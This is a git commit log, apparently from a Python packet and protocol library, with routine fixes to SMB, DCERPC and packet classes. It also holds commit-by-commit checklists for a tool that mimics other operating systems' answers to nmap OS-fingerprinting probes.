Date:   Wed Apr 29 16:27:29 2009 +0000

    no real changes`

commit 3fa7ba9ba2a0db667a6c174c01e40763c2f82601
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 28 19:55:46 2009 +0000

    an EthernetPacket can have just Data() inside, if this is the case,
    it should not ask the ether_type to the Data(), but instead use what's
    set in itself

commit 76228245df30d855b0c20e38e6fc520f73a9b30c
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 28 19:06:19 2009 +0000

    default argument for msg in dump()

commit 979465e306d897f3f28a34d172c989a0455d47b3
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 28 19:06:10 2009 +0000

    bug fix, uuid was set instead of objuuid

commit 41847ccf70b337c31206b7e7a1c1a8da18c68060
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 23 20:43:13 2009 +0000

    added impact compatibility

commit fffd897ec720ee11ca3eff026b682a3ad4d01b9b
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 23 20:02:50 2009 +0000

    fixed ClosedTCPResponder and added it to the list of responders
    
    initial seq number for TCPResponders is now according to the generator

commit 1704aedb569e93458af486e35bb176b75d7bd1bf
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Apr 20 21:17:19 2009 +0000

    # [x] TCP RST data checksum (RD)
    
    I forgot this test before, now we are really done

commit 6f798462f84f2b9a3949697e8f7a5ae784a2d892
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Apr 20 21:16:34 2009 +0000

    small module to compensate crc32

commit 21fde00a304ca7784be72f593eda3c41982a9e2b
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 16 20:28:59 2009 +0000

    # U1()
    # [x] Responsiveness (R)
    # [x] IP don't fragment bit (DF)
    # [x] IP initial time-to-live (T)
    # [x] IP initial time-to-live guess (TG)
    # [x] IP total length (IPL)
    # [x] Unused port unreachable field nonzero (UN)
    # [x] Returned probe IP total length value (RIPL)
    # [x] Returned probe IP ID value (RID)
    # [x] Integrity of returned probe IP checksum value (RIPCK)
    # [x] Integrity of returned probe UDP checksum (RUCK)
    # [x] Integrity of returned UDP data (RUD)
    # [-] ??? (TOS) Type of Service
    # [-] ??? (RUL) Length of return UDP packet is correct
    
    and we are done!

commit c32a707b4821d6960b93d3b7d37e0374c1ed947a
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 16 20:23:49 2009 +0000

    modified a little bit how default options are handlded

commit ed262c24999ca451c0b72da949396685e456eb48
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 16 20:23:02 2009 +0000

    # U1()
    # [x] Responsiveness (R)
    # [x] IP don't fragment bit (DF)
    # [x] IP initial time-to-live (T)
    # [x] IP initial time-to-live guess (TG)
    # [x] IP total length (IPL)
    # [x] Unused port unreachable field nonzero (UN)
    # [x] Returned probe IP total length value (RIPL)
    # [x] Returned probe IP ID value (RID)
    # [x] Integrity of returned probe IP checksum value (RIPCK)
    # [x] Integrity of returned probe UDP checksum (RUCK)
    # [ ] Integrity of returned UDP data (RUD)
    # [-] ??? (TOS) Type of Service
    # [-] ??? (RUL) Length of return UDP packet is correct

commit dae8dc625f9f5b43a17b24f532cf83ec9725fce3
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 16 20:18:52 2009 +0000

    # U1()
    # [x] Responsiveness (R)
    # [x] IP don't fragment bit (DF)
    # [x] IP initial time-to-live (T)
    # [x] IP initial time-to-live guess (TG)
    # [x] IP total length (IPL)
    # [x] Unused port unreachable field nonzero (UN)
    # [x] Returned probe IP total length value (RIPL)
    # [x] Returned probe IP ID value (RID)
    # [x] Integrity of returned probe IP checksum value (RIPCK)
    # [ ] Integrity of returned probe UDP checksum (RUCK)
    # [ ] Integrity of returned UDP data (RUD)
    # [-] ??? (TOS) Type of Service
    # [-] ??? (RUL) Length of return UDP packet is correct

commit 1f06a057216ba6f881a7520d462889c86b6c8d64
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 16 20:05:23 2009 +0000

    # U1()
    # [x] Responsiveness (R)
    # [x] IP don't fragment bit (DF)
    # [x] IP initial time-to-live (T)
    # [x] IP initial time-to-live guess (TG)
    # [x] IP total length (IPL)
    # [x] Unused port unreachable field nonzero (UN)
    # [x] Returned probe IP total length value (RIPL)
    # [x] Returned probe IP ID value (RID)
    # [ ] Integrity of returned probe IP checksum value (RIPCK)
    # [ ] Integrity of returned probe UDP checksum (RUCK)
    # [ ] Integrity of returned UDP data (RUD)
    # [-] ??? (TOS) Type of Service
    # [-] ??? (RUL) Length of return UDP packet is correct

commit f51f3777f97f60e40d25d9d97db1b533ab0ff04b
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 16 20:03:31 2009 +0000

    # U1()
    # [x] Responsiveness (R)
    # [x] IP don't fragment bit (DF)
    # [x] IP initial time-to-live (T)
    # [x] IP initial time-to-live guess (TG)
    # [x] IP total length (IPL)
    # [x] Unused port unreachable field nonzero (UN)
    # [x] Returned probe IP total length value (RIPL)
    # [ ] Returned probe IP ID value (RID)
    # [ ] Integrity of returned probe IP checksum value (RIPCK)
    # [ ] Integrity of returned probe UDP checksum (RUCK)
    # [ ] Integrity of returned UDP data (RUD)
    # [-] ??? (TOS) Type of Service
    # [-] ??? (RUL) Length of return UDP packet is correct

commit 291fdb9ca7a08cc92d26a9ee8a58af24d65b433f
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 16 20:00:24 2009 +0000

    # U1()
    # [x] Responsiveness (R)
    # [x] IP don't fragment bit (DF)
    # [x] IP initial time-to-live (T)
    # [x] IP initial time-to-live guess (TG)
    # [x] IP total length (IPL)
    # [x] Unused port unreachable field nonzero (UN)
    # [ ] Returned probe IP total length value (RIPL)
    # [ ] Returned probe IP ID value (RID)
    # [ ] Integrity of returned probe IP checksum value (RIPCK)
    # [ ] Integrity of returned probe UDP checksum (RUCK)
    # [ ] Integrity of returned UDP data (RUD)
    # [-] ??? (TOS) Type of Service
    # [-] ??? (RUL) Length of return UDP packet is correct

commit e1b8d774498052bb800a76726e58fce6693bceea
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 16 19:52:31 2009 +0000

    # U1()
    # [x] Responsiveness (R)
    # [x] IP don't fragment bit (DF)
    # [x] IP initial time-to-live (T)
    # [x] IP initial time-to-live guess (TG)
    # [x] IP total length (IPL)
    # [ ] Unused port unreachable field nonzero (UN)
    # [ ] Returned probe IP total length value (RIPL)
    # [ ] Returned probe IP ID value (RID)
    # [ ] Integrity of returned probe IP checksum value (RIPCK)
    # [ ] Integrity of returned probe UDP checksum (RUCK)
    # [ ] Integrity of returned UDP data (RUD)
    # [-] ??? (TOS) Type of Service
    # [-] ??? (RUL) Length of return UDP packet is correct

commit 0b62023ac0808c713b114b553a6cd49a13724c1d
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 16 19:35:16 2009 +0000

    # U1()
    # [x] Responsiveness (R)
    # [x] IP don't fragment bit (DF)
    # [x] IP initial time-to-live (T)
    # [x] IP initial time-to-live guess (TG)
    # [ ] IP total length (IPL)
    # [ ] Unused port unreachable field nonzero (UN)
    # [ ] Returned probe IP total length value (RIPL)
    # [ ] Returned probe IP ID value (RID)
    # [ ] Integrity of returned probe IP checksum value (RIPCK)
    # [ ] Integrity of returned probe UDP checksum (RUCK)
    # [ ] Integrity of returned UDP data (RUD)
    # [-] ??? (TOS) Type of Service
    # [-] ??? (RUL) Length of return UDP packet is correct

commit f32434874b4f021c91d09970c6ae08aa40449464
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 16 19:34:48 2009 +0000

    first tests on NMAP2UDPResponder
    # U1()
    # [x] Responsiveness (R)
    # [x] IP don't fragment bit (DF)
    # [x] IP initial time-to-live (T)

commit 8dabad50e2b2cb50760355671e11eac5f22ba3b3
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 16 18:58:48 2009 +0000

    added UDPResponder, ClosedUDPResponder and OpenUDPResponder... all working :)

commit 3eca8d639abe21d325894c976be0c125c358d442
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 16 18:43:29 2009 +0000

    initAnswer() --> buildAnswer()

commit 497d95c90b0d8bf18bd80c55641dbf1737a4ac1e
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 16 18:36:05 2009 +0000

    refactored a little bit:
    
        moved initAnswer() to the top class (Responder) and
        added the logic to initAnswer() -> sendPacket() to Responder.process()
    
        The open ports are now a list of ports, and only Machine knows about it
        Closed ports are not listed, are those not open

commit 1295ddabec5e130e1d4d94af3c86e0a78a3bdc19
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 23:18:07 2009 +0000

    marked a few more things done (they were done before, just not marked)

commit 832d3466ed2d0e1fa83dcc4b9bca208e0609d048
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 22:59:28 2009 +0000

    not randomizing the delta for stdDev

commit e5e61030944018d3e274151386291847dc18569e
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 22:52:11 2009 +0000

    # [x] IP ID sequence generation algorithm on ICMP messages (II)
    # [x] Shared IP ID sequence Boolean (SS)

commit c5efeea3751abfba64b03e279b6563c33201ffba
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 22:28:16 2009 +0000

    # [x] IP Type of Service (TOSI)

commit f34a8edbc5da9c56958287687287e535b8fea1b9
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 22:19:49 2009 +0000

    # [x] ICMP response code (CD)

commit 7b9e9248270aee95fdb9ff2b8987d68b16242b73
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 22:08:38 2009 +0000

    # [x] ICMP Sequence number (SI)

commit 23fba4a4d8c056519e0d2bf45af8613508a8f1ee
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 22:01:52 2009 +0000

    some safe checking on unsupported on IE(DFI) and IE(DLI)
    we should do this on every other option

commit bc9521c8df4ead35b661585f2a175b1818ef6bab
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 21:53:23 2009 +0000

    +# [x] IP Data Length (DLI)

commit d95ae313fd5c0bc7400a8464e71e165c22ef8f64
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 21:49:00 2009 +0000

    # IE()
    # [x] Responsiveness (R)
    # [x] Don't fragment (ICMP) (DFI)
    # [x] IP initial time-to-live (T)
    # [x] IP initial time-to-live guess (TG)

commit 31c0a58064441d017cc2be1ab8f25f5e2ef9d8ce
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 21:45:27 2009 +0000

    Improved a lot GCD, ISR and SP emulation!!!
    
    thanks to talking to aureliano we realized that if sequence numbers are
    generated on Timer events, then, the numbers are incremented only at this events
    and it doesn't matter how close we are sampling to the event, so we don't have
    to roung to the closes integer, but rather truncate to the previous

commit 383e915315c45681b70eb4aa6e4b7ee6cc4de7d2
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 19:40:31 2009 +0000

    +# [x] IP ID sequence generation algorithm (TI)
    +#   [x] Z  - All zeros
    +#   [x] RD - Random: It increments at least once by at least 20000.
    +#   [x] RI - Random positive increments. Any (delta_i > 1000, and delta_i % 256 != 0) or (delta_i > 256000 and delta_i % 256 == 0)

commit 5d8ea44b720a92f68b274f2716f2d7335292c8c5
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 19:39:37 2009 +0000

    fixed initial window size. it was fixed 0, and then, it was not hex encoeded

commit 6461e0937fbbbb24fe66a2f1293252a271f61dda
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 19:29:08 2009 +0000

    removed some void __init__()s
    bugfix: making a copy of the fingerprint from the machine, otherwise subsequent changes affect all references to the fingerprint (all SEQn where sharing and changing the same fingerprint)
    changed how test SP (stdDev) is computed and used. Now we are trying adding a random value

commit 08ce67bbe54e9002369d076cf7ba4a19acc3af89
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 19:26:18 2009 +0000

    set_ts_echo() was not working... at all

commit fc404cbd26ed65a40676ba3053ac10c3b833e6dd
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 16:43:44 2009 +0000

     # [ ] IP ID sequence generation algorithm (TI)
     +#   [+] Z  - All zeros
     +#   [+] RD - Random: It increments at least once by at least 20000.
     +#   [-] Hex Value - fixed IP ID
     +#   [+] RI - Random positive increments. Any (delta_i > 1000, and delta_i % 256 != 0) or (delta_i > 256000 and delta_i % 256 == 0)
     +#   [x] BI - Broken increment. All delta_i % 256 = 0 and all delta_i <= 5120.
     +#   [x] I - Incremental. All delta_i < 10
     +#   [x] O - (Ommited, the test does not show in the fingerprint). None of the other
    
    I also added simplifyFinerprints() which simplifies them by leaving only the first option when there are more than one (separated by | in the fingerprint file)

commit b9c705f8af50cfef3307f58f5749ee96a48e96ab
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 16:04:40 2009 +0000

    Added DF, MF and RF to the __str__ of IP packets
    Added ece and cwr to the __str__ of TCP packets

commit 81e730b94183f9dff86a75af4e2811a553033741
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 15:52:27 2009 +0000

    a few bugs introduced in the latest commit

commit cf55eb8068859f947404759ab639d0f7ff06df4d
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 15:46:37 2009 +0000

     # All Probes
    +# [|] SEQ
    +# [x] OPS
    +# [x] WIN
    
     # All Tests
    
     # SEQ()
    +# [x] TCP ISN sequence predictability index (SP)
    +# [x] TCP ISN greatest common divisor (GCD)
    +# [x] TCP ISN counter rate (ISR)
     # [ ] IP ID sequence generation algorithm (TI)
    +#   [ ] Z  - All zeros
    +#   [ ] RD - Random: It increments at least once by at least 20000.
    +#   [ ] Hex Value - fixed IP ID
    +#   [ ] RI - Random positive increments. Any (delta_i > 1000, and delta_i % 256 != 0) or (delta_i > 256000 and delta_i % 256 == 0)
    +#   [ ] BI - Broken increment. All delta_i % 256 = 0 and all delta_i <= 5120.
    +#   [ ] I - Incremental. All delta_i < 10
    +#   [ ] O - (Ommited, the test does not show in the fingerprint). None of the other
    +# [x] TCP timestamp option algorithm (TS)
    +#   [x] U - unsupported (don't send TS)
    +#   [x] 0 - Zero
    +#   [x] 1 - 0-5.66 (2 Hz)
    +#   [x] 7 - 70-150 (100 Hz)
    +#   [x] 8 - 150-350 (200 Hz)
    +#   [x]   - avg_freq = sum(TS_diff/time_diff) . round(.5 + math.log(avg_freq)/math.log(2)))
    +#           time_diff = 0.11 segs
     # OPS()
    +# [x] TCP options (O, O1-O6)
     # WIN()
    +# [x] TCP initial window size (W, W1-W6)
     # ECN, T1-T7
    +# [x] TCP options (O, O1-O6)
    +# [x] TCP initial window size (W, W1-W6)
    +# [ ] IP Type of Service (TOSI)
    +# [ ] ICMP Sequence number (SI)
    +# [ ] IP Data Length (DLI)
    +# [ ] ??? (TOS) Type of Service
    +# [ ] ??? (RUL) Length of return UDP packet is correct

commit 8305242cdcfe47d33fd78e3d70211b82d2557f8c
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 15:43:52 2009 +0000

    More complete:
    
    +# All Probes
    +# [ ] SEQ
    +# [ ] OPS
    +# [ ] WIN
    +# [x] T1
    +# [x] T2
    +# [x] T3
    +# [x] T4
    +# [x] T5
    +# [x] T6
    +# [x] T7
    +# [ ] IE
    +# [x] ECN
    +# [ ] U1
    +
    +# All Tests
    +
    +# SEQ()
    +# [ ] TCP ISN sequence predictability index (SP)
    +# [ ] TCP ISN greatest common divisor (GCD)
    +# [ ] TCP ISN counter rate (ISR)
    +# [ ] IP ID sequence generation algorithm (TI)
    +# [ ] IP ID sequence generation algorithm (CI)
    +# [-] IP ID sequence generation algorithm (II)
    +# [ ] Shared IP ID sequence Boolean (SS)
    +# [ ] TCP timestamp option algorithm (TS)
    +# OPS()
    +# [+] TCP options (O, O1-O6)
    +# WIN()
    +# [+] TCP initial window size (W, W1-W6)
    +# ECN, T1-T7
    +# [+] TCP options (O, O1-O6)
    +# [+] TCP initial window size (W, W1-W6)
    +# [x] Responsiveness (R)
    +# [x] IP don't fragment bit (DF)
    +# [x] IP initial time-to-live (T)
    +# [x] IP initial time-to-live guess (TG)
    +# [x] Explicit congestion notification (CC)
    +# [x] TCP miscellaneous quirks (Q)
    +# [x] TCP sequence number (S)
    +# [x] TCP acknowledgment number (A)
    +# [x] TCP flags (F)
    +# [ ] TCP RST data checksum (RD)
    +# IE()
    +# [ ] Responsiveness (R)
    +# [ ] Don't fragment (ICMP) (DFI)
    +# [ ] IP initial time-to-live (T)
    +# [ ] IP initial time-to-live guess (TG)
    +# [ ] ICMP response code (CD)
    +# [ ] ??? (TOSI)
    +# [ ] ??? (SI)
    +# [ ] ??? (DLI)
    +# U1()
    +# [ ] Responsiveness (R)
    +# [ ] IP don't fragment bit (DF)
    +# [ ] IP initial time-to-live (T)
    +# [ ] IP initial time-to-live guess (TG)
    +# [ ] IP total length (IPL)
    +# [ ] Unused port unreachable field nonzero (UN)
    +# [ ] Returned probe IP total length value (RIPL)
    +# [ ] Returned probe IP ID value (RID)
    +# [ ] Integrity of returned probe IP checksum value (RIPCK)
    +# [ ] Integrity of returned probe UDP checksum (RUCK)
    +# [ ] Integrity of returned UDP data (RUD)
    +# [ ] ??? (TOS)
    +# [ ] ??? (RUL)
    +

commit 4cd4227c484e8015ea2eaaeed5aeba8f7128eaa7
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 15:42:31 2009 +0000

    a bugfix, the this fix was ported to the orignal impact module

commit dab1808ee5fca4b042fe464abb3df39d5ffbdbff
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 15:40:14 2009 +0000

    This version answers ECN probes, although it's composing answers as
    it will be for any other probe. It still laks a few tests though,
    and all the SEQ(), IE() and U1()

commit 1dbf41b102a43b51b6346bd6f69e54ad8ab1de46
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 15:38:50 2009 +0000

    nmapAnswreingMachine.py is a tool to impersonate any stack for nmap's -O (OS fingerprint) option. It only supports nmap's second generation fingerprint DB
    
    os_ident.py is a modification of the IMPACT module, we take some classes defining the probe packets from it. We may want to trim this file before releasing

commit e843556daf05270e672418058b31cc4e133fb49e
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Feb 19 16:05:31 2009 +0000

    Fixing a bug reported by Bernd Deichmann <bd@deichmann-edv.de>.
    On some cards, and for some packets, extra data comes after the full packet.
    This fix uses the length in the IP header to cut the payload to its real length

commit b695aeed9526c3cfd5bf54c672ddfb9e3d7cb129
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Aug 1 19:54:40 2008 +0000

    changelong for last commit

commit 0c44c61ea526515943946cc2fea0be000905344a
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Aug 1 19:48:10 2008 +0000

    fix to TCP.get_echo_ts() submitted by Tom Coote

commit 984c3b4d62f9f80dd9f67531e6d64e2ca4167d16
Author: max <max@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 3 20:53:08 2006 +0000

    fixed bug in display_time (reported by grutz _at_ jingojango.net)
    cleaned up code using display_time

commit a951dea81b4ea743f7882cf3d29f156b77130f20
Author: max <max@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Sep 25 15:33:59 2006 +0000

    fixed setup.py where doc files were installed on usr/bin
    replaced @ in changelog with _at_, as some people are archiving packages on websites were spammers can crawl them

commit 9a2571ef2a09b21aa29ed6356323a1beac5e0b43
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Sep 6 15:54:08 2006 +0000

    __socket changes by buk

commit 43c482ef63a473cfd659ef0aad0bfe210228bf78
Author: max <max@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 28 14:57:03 2006 +0000

    fixed syntax error

commit f7196438bee94f3f6f9af23bdbccc225df2be10d
Author: max <max@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 23 18:33:29 2006 +0000

    fixed TCP.get_th_sum() bug reported by ranusy@gmail.com

commit 01b882774af2d070d1397077bc41f91168425a71
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 30 15:51:10 2006 +0000

    samr: Python 2.4 raises an exception where python 2.0 didn't. We need to
            catch it
    printer: RawCall() no more, now self.dce.call()

commit 65a98cfef8de4e62123c0e3a4b72b26a106b0330
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 23 22:26:51 2006 +0000

    retabbed

commit 2df6998ef99838e4b5f2bd73e6e8dc36c199613f
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 23 21:19:26 2006 +0000

    copyrights

commit 65be005f641a9e9337aa668122e8e97875388d21
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 22 22:19:58 2006 +0000

    new files aded

commit 01c4a4d45cce4c97c4d4353a6204d050473d41bb
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 22 22:16:38 2006 +0000

    new examples to show newer features

commit 2ce42b2faf6cd602eca47bd8fd4f8d4ca71d7576
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 22 22:16:15 2006 +0000

    Lots of changes.
    SMB rewriten using Structure, added hashes authentication chainable
    commands, lots of commands, etc.
    DCERPC cleaned up, added authentication and encryption, fragmentation
    and more things

commit 2722624bc190069d4da0a4e62c136a665514001c
Author: max <max@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Apr 3 15:52:03 2006 +0000

    New release

commit f0bacb04cf69d120d6fc85a77b75218633b2c960
Author: max <max@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Apr 3 15:49:23 2006 +0000

    Fixed byte ordering bug when using IP_HDRINCL in BSD systems (patch supplied by ginga@ginganet.org).

commit 83e7538d2bdc2f4568e363c4d958ebd41347cffb
Author: max <max@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Apr 3 15:20:34 2006 +0000

    Fixes bug when parsing ARP packets

commit 8c4a96e91e896752636772c9943004e978c9370e
Author: max <max@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Sep 21 19:07:55 2005 +0000

    removed old import

commit 5202a11373dc03e683a7d37d4e7a1bfbb09586d0
Author: max <max@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 28 21:06:24 2005 +0000

    fixed bug in set_icmp_nextmtu()

commit f90e0848d3d6ffc2ebb44171699c0776e8213a07
Author: max <max@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 28 20:41:59 2005 +0000

    fixed icmp unreachable bug

commit 2a1e35ed7421a061fce93d3c215051721e06c526
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Feb 26 20:55:01 2004 +0000

    *** empty log message ***

commit f3c4b05728ed50c863548ff99a01e47b03206c5f
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Feb 26 20:54:45 2004 +0000

    Fixed as_{hrd,pro} methods to not invoke the tolist method, because they were being called with array objects as input, and anyway it wasn't necessary to call that method for what they did.

commit f9c57d8cec1569c56b99fcb4da4e6d5d19d67759
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 16 17:27:57 2003 +0000

    Fixed URL

commit 4511c3234966206b2b0ce0596b5be4fbf0d24d21
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 16 17:26:31 2003 +0000

    -

commit 890d9bf3e07197b17494e1f24399d2e2911a29c3
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 16 17:26:22 2003 +0000

    Bumped version number.

commit 32ba2a07db8f251fb30eb2db05d21ff01fe13cef
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 16 17:25:26 2003 +0000

    -

commit eeb648a333040b28beff2c4e4c3715ba3f2c202f
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 16 17:23:42 2003 +0000

    Fixed wrong indentation that was causing fragmentation to go wrong.

commit 7dc3c77d4ecf6f90d91a82867b45e18e12df9c87
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Dec 10 23:42:47 2003 +0000

    Bumped version number.

commit 6d86749f2e6ab3cff8d92a36415978a9729c2bcc
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Dec 10 23:42:15 2003 +0000

    -

commit f86b8cc26460451cc6d723b47419d5dc8f3b265a
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Dec 10 23:41:43 2003 +0000

    (DCERPC_v4.bind): support idempotent flag.
    (DCERPC_v4.send): reduced fragment size to avoid IP fragmentation on links with MTU = 1500. Added a method that allows the caller to configure this size.

commit 6d2b1a19aae53d438cbd5c3cbb05485b77705ed5
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 2 22:42:55 2003 +0000

    Updates.

commit faa6d8b3020e4f62e97cbdc532b0f23565e8f2b0
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 2 22:42:48 2003 +0000

    DCERPC_v4.bind: made self.__bind protected
    DCERPC_v4.send: fragment outgoing packets.

commit 4c35168a0e3781430054ee4b6fd7ab5521b7fd39
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 28 15:39:11 2003 +0000

    Include ChangeLog in packet.

commit 37ab5e554ebe47d88cc987012dcddc59038f6147
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 28 15:38:39 2003 +0000

    Initial revision.

commit c19c79f07308e57f65ab7d7009b721c192abbae6
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 28 15:32:56 2003 +0000

    Fixed self.bind variable having the same name than a method.
    Thanks Python for being so stupidily untyped :)

commit 4415e5a3183a85e378336095564377ec567a934f
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 14 21:26:07 2003 +0000

    Properly support Unicode input.

commit 227c6bd63e676f3e9880f9310714ec3e0d34f71c
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 14 21:01:43 2003 +0000

    Bumped version number.

commit 3a02cd9550a0769747ddac039c38fde45999f972
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 14 21:00:56 2003 +0000

    Properly support Unicode.

commit e58c84a2359197b30ba3d289ecbe09d9e0fb5d04
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Oct 31 21:16:50 2003 +0000

    Bumped version to 0.9.3.

commit 5eafe72c26521b087899ab82771bdcdb160d70de
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Oct 31 21:14:21 2003 +0000

    Fixed offset of handle in SVCCTLRespCreateServiceHeader.

commit 6dc9e592612796254188d8a88d863e511ad8aff5
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 28 21:05:16 2003 +0000

    Bumped version number to 0.9.2.

commit 45883a7afa48292323ea97da8c20dc9bf1707eee
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 28 21:03:08 2003 +0000

    Initial revision.

commit 611348de29fe4a3c6f9d2cef10b5c602455860bf
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 28 21:02:20 2003 +0000

    Fixed output formatting.

commit c273b0e33f6395231d69c8ec91a7ae45e571ce06
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 28 20:52:12 2003 +0000

    Added missing imports.

